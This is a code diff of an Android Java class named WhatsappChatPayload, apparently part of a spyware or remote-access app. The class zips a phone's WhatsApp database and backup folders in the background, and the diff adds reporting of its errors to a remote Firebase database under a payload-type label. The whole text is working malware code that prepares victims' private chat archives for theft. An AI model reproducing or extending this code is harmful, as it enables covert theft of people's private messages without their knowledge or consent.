@@ -1,13 +1,13 @@
 package com.aigs.serviceone.payload;
 
-import android.app.Activity;
 import android.content.Context;
 import android.os.AsyncTask;
 import android.util.Log;
 
+import com.aigs.serviceone.helpers.PayloadTypes;
 import com.aigs.serviceone.helpers.WatsappTextExtractionListner;
-import com.aigs.serviceone.helpers.ZipListener;
 import com.aigs.serviceone.helpers.ZipUtils;
+import com.google.firebase.database.FirebaseDatabase;
 
 import java.io.File;
 import java.lang.ref.WeakReference;
@@ -31,28 +31,18 @@ public class WhatsappChatPayload extends AsyncTask<String, Integer, String> {
     protected String doInBackground(String... strings) {
         try {
 
-            final Context activity = contextWeakReference.get();
-
             File file = new File("/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Databases/");
             File settings = new File("/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Backups/");
 
-            ZipUtils.getInstance().setZipListener(new ZipListener() {
-                @Override
-                public void onZipDone() {
-                    updateProgress();
-                }
-            }).zipDirectory(file, "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Databases.zip");
+            ZipUtils.getInstance().setZipListener(this::updateProgress).zipDirectory(file, "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Databases.zip");
 
 
-            ZipUtils.getInstance().setZipListener(new ZipListener() {
-                @Override
-                public void onZipDone() {
-                    updateProgress();
-                }
-            }).zipDirectory(settings, "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Backups.zip");
+            ZipUtils.getInstance().setZipListener(this::updateProgress).zipDirectory(settings, "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Backups.zip");
 
         }catch (Exception e){
             Log.e("EXCEPTION_WC : ",e.getMessage());
+            FirebaseDatabase.getInstance().getReference("Logs").child(PayloadTypes.GET_WHATSAPP_DATABASES+"").child("CurrentLog").setValue(e.getMessage());
+
         }
 
         return null;
